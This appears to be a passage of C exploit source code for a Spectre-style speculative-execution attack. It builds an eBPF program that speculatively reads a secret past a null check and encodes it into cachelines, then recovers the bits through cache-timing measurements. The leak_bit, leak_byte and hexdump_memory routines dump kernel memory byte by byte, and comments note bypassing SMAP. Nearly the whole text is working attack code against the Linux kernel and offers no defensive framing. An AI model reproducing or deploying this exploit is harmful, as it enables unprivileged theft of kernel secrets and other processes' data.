  // control runtime behavior with this.
  // slot 0: index of secret value
  // slot 1: start offset in prog_map
  // slot 2: bitmask (1/2/4/8/...)
  // slot 3: bitshift selector (0/1/2/3/...)
  ret.data_map = array_create(8, 4);

  struct bpf_insn insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r7 = bitmask
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 2),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

    // r9 = bitshift selector
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 3),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),

    // r8 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

    // r0 = secret_data_offset = *map_lookup_elem(data_map, &0)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

    // r2 = &secret_data_offset
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_STX_MEM(BPF_W, BPF_REG_ARG2, BPF_REG_0, 0),

    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.victim_map),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), /* speculative execution starts in here */
    BPF_GOTO_EXIT_IF_R0_NULL, /* predicted: non-NULL, actual: NULL */
    BPF_LDX_MEM(BPF_DW, BPF_REG_ARG3, BPF_REG_0, 0),
	//BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),  /* leak test - fp */

    /*
     * mask and shift secret value so that it maps to one of two cachelines.
     */
    BPF_ALU64_REG(BPF_AND, BPF_REG_ARG3, BPF_REG_7),
    BPF_ALU64_REG(BPF_RSH, BPF_REG_ARG3, BPF_REG_9),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_ARG3, 7),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_ARG3, BPF_REG_8),

    BPF_LD_MAP_FD(BPF_REG_ARG2, ret.prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  int exit_idx = ARRSIZE(insns) - 1;
  for (int i=0; i<ARRSIZE(insns); i++) {
    if (insns[i].code == (BPF_JMP | BPF_OP(BPF_JEQ) | BPF_K) && insns[i].off == 0x7ff) {
      insns[i].off = exit_idx - i - 1;
    }
  }

  
  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  

  return ret;
}

#define ABS(x) ((x)<0 ? -(x) : (x))

int leak_bit(struct mem_leaker_prog *leakprog, unsigned long dw_offset,
        unsigned long in_dw_bit_offset,
		unsigned long kernel_leak_area_index, char *kernel_leak_area,
        unsigned long user_leak_area_index, char *user_leak_area) {
  array_set_dw(leakprog->data_map, 2, 1UL<<in_dw_bit_offset); // 2 - bitmask
  array_set_dw(leakprog->data_map, 3, in_dw_bit_offset);  // 3 - bitshift

  char *user_leak_ptr1 = user_leak_area;
  char *user_leak_ptr2 = user_leak_area + 1024; /* 64 * 8 = 1024,  8 cache lines,  Leak a bit!! */

  for (int i=0; i<0x201; i++) {
    if ((i & 0xf) != 0xf) {
      array_set_dw(leakprog->data_map, 0, 3); // access at 8*3,  0 - index of secret value
      array_set_dw(leakprog->data_map, 1, 0); // execute instaquit program, 1 - start offset in prog_map
    } else {
      array_set_dw(leakprog->data_map, 0, dw_offset); // access at 8*dw_offset
	  array_set_dw(leakprog->data_map, 1, kernel_leak_area_index); // leak to kernel-direct-mmaped space, to bypass SMAP */

      bounce_two_cachelines(leakprog->victim_map, leakprog->prog_map);
      user_flush_cacheline(user_leak_ptr1);
      user_flush_cacheline(user_leak_ptr2);
    }

    trigger_proc(leakprog->sockfd);

    if ((i & 0xf) == 0xf) {
      int times[2];
      times[0] = user_timed_reload(user_leak_ptr1);
      times[1] = user_timed_reload(user_leak_ptr2);
      bool bit_is_0 = (times[0] < 120);
      bool bit_is_1 = (times[1] < 120);
      if (bit_is_0 != bit_is_1) {
        return bit_is_1;
      } else {
        
      }
    }
  }

  return -1;
}

int leak_byte(struct mem_leaker_prog *leakprog, unsigned long byte_offset,
		unsigned long kernel_leak_area_index, char *kernel_leak_area,
        unsigned long user_leak_area_index, char *user_leak_area) {
  int byte = 0;
  int bit_pos_for_byte = (byte_offset&0x7)*8;
  for (int pos = 0; pos < 8; pos++) {
    int bit = leak_bit(leakprog, byte_offset/8, bit_pos_for_byte + pos,
            kernel_leak_area_index, kernel_leak_area, user_leak_area_index, user_leak_area);
    if (bit == -1) {
      return -1;
    }
    if (bit == 1) {
      byte |= (1<<pos);
    }
  }
  return byte;
}

void hexdump_memory(struct mem_leaker_prog *leakprog,
		unsigned long kernel_leak_area_index, char *kernel_leak_area,
        unsigned long user_leak_area_index, char *user_leak_area,
        unsigned long byte_offset_start, unsigned long byte_count) {
  // user_leak_area :  User space memory for probing access of speculative execution.
  // user_leak_area_index :  (prog_map - user_leak_area) / 8;  In other words, It's offset for access of function pointer array.
  if (byte_count % 16)
    return;
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    int bytes[16];
    for (int i=0; i<16; i++) {
      bytes[i] = leak_byte(leakprog, byte_offset + i, kernel_leak_area_index, kernel_leak_area, user_leak_area_index, user_leak_area);
    }
    char line[1000];
    char *linep = line;
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        *(linep++) = '?';
      } else {
        if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
          *(linep++) = bytes[i];
        } else {
          *(linep++) = '.';
        }
      }
    }
  }
}

int main(void) {
  setbuf(stdout, NULL);

  // pin to core 0
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    return -1;

  struct mem_leaker_prog leakprog = load_mem_leaker_prog();
  char *user_leak_area = (char*)user_leak_area_smap;

  unsigned long user_leak_area_offset = 0;
  unsigned long kernel_leak_area_offset = 0;

  if ((user_leak_area_offset & 7) || (kernel_leak_area_offset & 7))
    return -1;

  unsigned long user_leak_area_index = user_leak_area_offset / 8;
  unsigned long kernel_leak_area_index = leakprog.kernel_leak_area_index;

  cacheline_bounce_worker_enable();

  hexdump_memory(&leakprog, kernel_leak_area_index, kernel_leak_area_smap, user_leak_area_index, user_leak_area, 0x1000, 0x100000000);

  return 0;
}